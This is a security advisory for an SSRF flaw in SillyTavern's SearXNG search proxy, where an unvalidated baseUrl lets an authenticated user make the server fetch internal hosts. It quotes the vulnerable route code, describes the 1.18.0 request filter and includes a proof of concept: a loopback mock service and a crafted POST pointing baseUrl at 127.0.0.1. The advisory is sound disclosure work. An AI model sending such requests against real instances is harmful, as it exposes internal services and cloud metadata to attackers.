# [H] SillyTavern: SSRF in SearXNG Search Proxy via Unvalidated baseUrl

## Summary
Severity: High
Advisory: GHSA-qg89-qwwh-5f3j
CVE: CVE-2026-46372
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-qg89-qwwh-5f3j
Type: github-advisory

## Affected
- npm: `sillytavern` — affected >=0 <1.18.0

## Details
## Resolution

SillyTavern 1.18.0 added a generic server-side request filter (Private Request Whitelisting). Since we expect users to use the application in a trusted environment, the filter is disabled by default, however it is strongly advised to be enabled and properly configured when an instance is being hosted over a network, as suggested by a console warning message and an officially published security checklist for administrators.

Documentation: 

- https://docs.sillytavern.app/administration/config-yaml/#private-address-whitelisting
- https://docs.sillytavern.app/administration/#security-checklist

## Note on future SSRF findings

Since the request filter applies to the entire application, no SSRF vulnerabilities against individual endpoints will be accepted, unless it has been proven that a properly configured and enabled filter can be bypassed in an undocumented way. Only advisories disclosed before the 1.18.0 release will be posted if their concern is SSRF.

## Summary
SillyTavern 1.17.0 exposes `/api/search/searxng`, which accepts attacker-controlled `baseUrl` and uses it directly to build outbound server-side fetches. An authenticated low-privilege user can point `baseUrl` at an internal or loopback HTTP service and receive the `/search` response body.

Confirmed version: SillyTavern 1.17.0 from the audited source tree. Broader affected versions and patched versions should be confirmed by the maintainer.

## Details
The `/api/search/searxng` route in `src/endpoints/search.js` reads `baseUrl` from `request.body` and performs no allowlist, IP range, DNS, or scheme validation before making outbound requests.

Core vulnerable path:

```js
router.post('/searxng', async (request, response) => {
    const { baseUrl, query, preferences, categories } = request.body;
    if (!baseUrl || !query) {
        return response.status(400).send('Missing required parameters');
    }

    const mainPageUrl = new URL(baseUrl);
    const mainPageRequest = await fetch(mainPageUrl, { headers: visitHeaders });
    ...
    const searchUrl = new URL('/search', baseUrl);
    const searchParams = new URLSearchParams();
    searchParams.append('q', query);
    ...
    const searchResult = await fetch(searchUrl, { headers: visitHeaders });
    ...
    const data = await searchResult.text();
    return response.send(data);
});
```

`src/server-startup.js` mounts this router at `/api/search`, and `src/server-main.js` applies login middleware before the API routes. This means the source is a remote authenticated POST request and the sink is server-side `fetch()` to attacker-selected hosts.

## PoC
Attacker prerequisites: a valid SillyTavern web session, or access to a deployment where user accounts are disabled.

Start an internal mock service on the target host:

```js
import http from 'node:http';

http.createServer((req, res) => {
  if (req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    return res.end('<html><head><link href="/client.css" rel="stylesheet"></head></html>');
  }
  if (req.url === '/client.css') {
    res.writeHead(200, { 'Content-Type': 'text/css' });
    return res.end('body{}');
  }
  if (req.url.startsWith('/search?q=')) {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    return res.end('INTERNAL-SEARCH-RESULT');
  }
  res.writeHead(404);
  res.end('not found');
}).listen(9091, '127.0.0.1');
```

Then send:

```http
POST /api/search/searxng HTTP/1.1
Host: TARGET:8000
Cookie: session-...=...
X-CSRF-Token: <token from /csrf-token>
Content-Type: application/json

{"baseUrl":"http://127.0.0.1:9091/","query":"x"}
```

Result based on the route logic: SillyTavern first fetches `http://127.0.0.1:9091/`, then fetches `http://127.0.0.1:9091/search?q=x`, and returns `INTERNAL-SEARCH-RESULT` to the attacker.

## Impact
This is an authenticated SSRF primitive with arbitrary host and port selection. It can disclose responses from loopback or internal HTTP services reachable from the SillyTavern host and may enable interaction with internal admin panels, development services, cloud metadata endpoints in applicable deployments, or service discovery across private networks.

## References
- https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-qg89-qwwh-5f3j
- https://nvd.nist.gov/vuln/detail/CVE-2026-46372
- https://github.com/SillyTavern/SillyTavern
